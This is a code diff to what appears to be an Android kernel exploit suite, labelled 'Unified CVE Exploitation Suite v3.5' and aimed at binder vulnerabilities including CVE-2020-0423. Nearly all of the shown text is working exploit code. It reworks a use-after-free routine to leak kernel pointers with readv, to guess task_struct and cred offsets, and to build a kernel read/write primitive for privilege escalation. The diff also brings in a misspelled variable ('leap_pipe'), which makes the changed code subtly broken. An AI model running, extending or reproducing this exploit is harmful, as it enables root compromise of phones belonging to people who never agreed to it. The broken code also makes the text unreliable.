@@ -428,7 +428,7 @@ static int setup_kernel_rw(void) {
 }
 
 static int exploit_cve_2020_0423_rw(void) {
-    printf("[*] Attempting kernel RW via CVE-2020-0423 UAF...\n");
+    printf("[*] Attempting kernel RW via CVE-2020-0423 UAF (readv method)...\n");
 
     for (int attempt = 0; attempt < 4; attempt++) {
         int binder_fd = open("/dev/binder", O_RDWR);
@@ -453,9 +453,15 @@ static int exploit_cve_2020_0423_rw(void) {
 
         void *buf = mmap_page(0x100000000UL);
         if (!buf) {
-            close(binder_fd); close(epoll_fd); close(leak_pipe[0]); close(leak_pipe[1]);
+            close(binder_fd); close(epoll_fd); close(leak_pipe[0]); close(leap_pipe[1]);
             continue;
         }
+
+        struct iovec iov[2];
+        iov[0].iov_base = buf;
+        iov[0].iov_len = PAGE_SIZE;
+        iov[1].iov_base = buf;
+        iov[1].iov_len = PAGE_SIZE;
 
         pid_t pid = fork();
         if (pid < 0) {
@@ -484,9 +490,9 @@ static int exploit_cve_2020_0423_rw(void) {
             wait(NULL);
             continue;
         }
-        printf("  [+] epoll event received, reading leak pipe...\n");
+        printf("  [+] epoll event received, reading with readv...\n");
 
-        ssize_t sz = read(leak_pipe[0], buf, PAGE_SIZE);
+        ssize_t sz = readv(leak_pipe[0], iov, 2);
         wait(NULL);
         close(binder_fd);
         close(epoll_fd);
@@ -494,30 +500,63 @@ static int exploit_cve_2020_0423_rw(void) {
         close(leak_pipe[1]);
 
         if (sz <= 0) {
-            printf("  [-] read leak pipe failed (attempt %d)\n", attempt);
+            printf("  [-] readv failed (attempt %d)\n", attempt);
             continue;
         }
 
         uint64_t *data = (uint64_t *)buf;
+        uint64_t binder_proc = 0;
+        uint64_t task_addr = 0;
+
         for (size_t i = 0; i < (size_t)(sz / 8); i++) {
             uint64_t val = data[i];
             if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
-                g_task_struct = val;
-                for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
-                    uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
-                    if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
-                        g_cred_off = g_offset_candidates[ci].cred;
-                        g_al_off = g_offset_candidates[ci].al;
-                        printf("  [+] Leaked task_struct @ 0x%llx (cred_off=0x%x, al_off=0x%x)\n",
-                               (unsigned long long)g_task_struct, g_cred_off, g_al_off);
-                        if (pipe(g_krw_pipe) < 0) return -1;
-                        if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) return -1;
-                        return 0;
+                if (binder_proc == 0) {
+                    binder_proc = val;
+                }
+                task_addr = val;
+            }
+        }
+
+        if (binder_proc != 0) {
+            int task_offsets[] = {0x20, 0x28, 0x30, 0x38, 0x40};
+            for (int j = 0; j < 5; j++) {
+                uint64_t candidate = binder_proc + task_offsets[j];
+                if ((candidate & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+                    g_task_struct = candidate;
+                    for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
+                        uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
+                        if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+                            g_cred_off = g_offset_candidates[ci].cred;
+                            g_al_off = g_offset_candidates[ci].al;
+                            printf("  [+] Leaked task_struct @ 0x%llx (cred_off=0x%x, al_off=0x%x)\n",
+                                   (unsigned long long)g_task_struct, g_cred_off, g_al_off);
+                            if (pipe(g_krw_pipe) < 0) return -1;
+                            if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) return -1;
+                            return 0;
+                        }
                     }
                 }
             }
         }
-        printf("  [-] No kernel pointer in attempt %d\n", attempt);
+
+        if (task_addr != 0) {
+            g_task_struct = task_addr;
+            for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
+                uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
+                if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+                    g_cred_off = g_offset_candidates[ci].cred;
+                    g_al_off = g_offset_candidates[ci].al;
+                    printf("  [+] Leaked task_struct directly @ 0x%llx (cred_off=0x%x, al_off=0x%x)\n",
+                           (unsigned long long)g_task_struct, g_cred_off, g_al_off);
+                    if (pipe(g_krw_pipe) < 0) return -1;
+                    if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) return -1;
+                    return 0;
+                }
+            }
+        }
+
+        printf("  [-] No usable kernel pointer in attempt %d\n", attempt);
     }
     printf("  [-] All attempts failed\n");
     return -1;
@@ -882,7 +921,7 @@ int main(void) {
     int kernel_rw_obtained = 0;
 
     printf("==================================================\n");
-    printf("  Unified CVE Exploitation Suite v3.4 (Fixed Leak)\n");
+    printf("  Unified CVE Exploitation Suite v3.5 (Final)\n");
     printf("  (CVE-2019-2215, 2020-0041, 2020-0423, 2019-2023)\n");
     printf("==================================================\n\n");
 
